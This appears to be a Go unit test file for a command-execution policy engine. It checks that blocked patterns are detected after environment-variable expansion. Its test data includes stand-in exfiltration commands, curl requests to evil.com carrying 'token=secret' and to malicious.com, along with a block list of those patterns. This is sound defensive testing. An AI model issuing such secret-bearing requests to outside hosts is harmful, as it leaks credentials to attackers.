package engine

import (
	"strings"
	"testing"
)

type mockPolicyBlockedPattern struct {
	blockedPatterns []string
	allowedBinaries []string
	safeEnv         map[string]string
}

func (m *mockPolicyBlockedPattern) ValidateAST(prog any) error                     { return nil }
func (m *mockPolicyBlockedPattern) CanExecuteSkill(ctx any, name string, args []string) error {
	return nil
}
func (m *mockPolicyBlockedPattern) IsAllowedBinary(name string) bool {
	for _, b := range m.allowedBinaries {
		if b == name {
			return true
		}
	}
	return false
}
func (m *mockPolicyBlockedPattern) MaxExecDuration() any    { return 30 }
func (m *mockPolicyBlockedPattern) MaxOutputBytes() int64   { return 1024 * 1024 }
func (m *mockPolicyBlockedPattern) SafeEnvironment() map[string]string {
	return m.safeEnv
}
func (m *mockPolicyBlockedPattern) IsBlockedPattern(script string) (bool, string) {
	for _, p := range m.blockedPatterns {
		if strings.Contains(script, p) {
			return true, p
		}
	}
	return false, ""
}
func (m *mockPolicyBlockedPattern) EnabledSkills() []string   { return nil }
func (m *mockPolicyBlockedPattern) AllowedBinaries() []string { return m.allowedBinaries }
func (m *mockPolicyBlockedPattern) SandboxConfig() any        { return nil }

func TestBlockedPattern_PostExpansion(t *testing.T) {
	pol := &mockPolicyBlockedPattern{
		blockedPatterns: []string{"token=secret"},
		allowedBinaries: []string{"curl"},
		safeEnv:         map[string]string{"MALICIOUS": "https://evil.com?token=secret"},
	}

	rawScript := `curl "$MALICIOUS"`
	blocked, _ := pol.IsBlockedPattern(rawScript)
	if blocked {
		t.Errorf("pattern should NOT be detected in raw script %q", rawScript)
	}

	expandedArgs := []string{"curl", "https://evil.com?token=secret"}
	fullCmd := strings.Join(expandedArgs, " ")
	blocked, pattern := pol.IsBlockedPattern(fullCmd)
	if !blocked {
		t.Errorf("pattern SHOULD be detected after expansion: %q", fullCmd)
	}
	if pattern != "token=secret" {
		t.Errorf("wrong pattern: got %q, want %q", pattern, "token=secret")
	}
}

func TestBlockedPattern_PostExpansionScenarios(t *testing.T) {
	tests := []struct {
		name        string
		expandedArgs []string
		wantBlocked bool
		wantPattern string
	}{
		{
			name:        "blocked pattern in URL arg",
			expandedArgs: []string{"curl", "https://evil.com?token=secret"},
			wantBlocked: true,
			wantPattern: "token=secret",
		},
		{
			name:        "blocked pattern in first arg",
			expandedArgs: []string{"curl", "https://malicious.com"},
			wantBlocked: true,
			wantPattern: "malicious.com",
		},
		{
			name:        "no blocked pattern",
			expandedArgs: []string{"curl", "https://safe.com"},
			wantBlocked: false,
			wantPattern: "",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			pol := &mockPolicyBlockedPattern{
				blockedPatterns: []string{"token=secret", "malicious.com"},
				allowedBinaries: []string{"curl"},
			}

			fullCmd := strings.Join(tc.expandedArgs, " ")
			blocked, pattern := pol.IsBlockedPattern(fullCmd)

			if blocked != tc.wantBlocked {
				t.Errorf("IsBlockedPattern(%q) = %v, want %v", fullCmd, blocked, tc.wantBlocked)
			}
			if tc.wantBlocked && pattern != tc.wantPattern {
				t.Errorf("pattern = %q, want %q", pattern, tc.wantPattern)
			}
		})
	}
}



func TestBlockedPattern_JoinsArgsCorrectly(t *testing.T) {
	pol := &mockPolicyBlockedPattern{
		blockedPatterns: []string{"pattern"},
		allowedBinaries: []string{"cmd"},
	}

	args := []string{"cmd", "arg1", "arg2", "arg3"}
	fullCmd := strings.Join(args, " ")

	expected := "cmd arg1 arg2 arg3"
	if fullCmd != expected {
		t.Errorf("strings.Join(args, \" \") = %q, want %q", fullCmd, expected)
	}

	blocked, _ := pol.IsBlockedPattern(fullCmd)
	if blocked {
		t.Error("pattern should not be detected in test args")
	}

	_ = pol
}
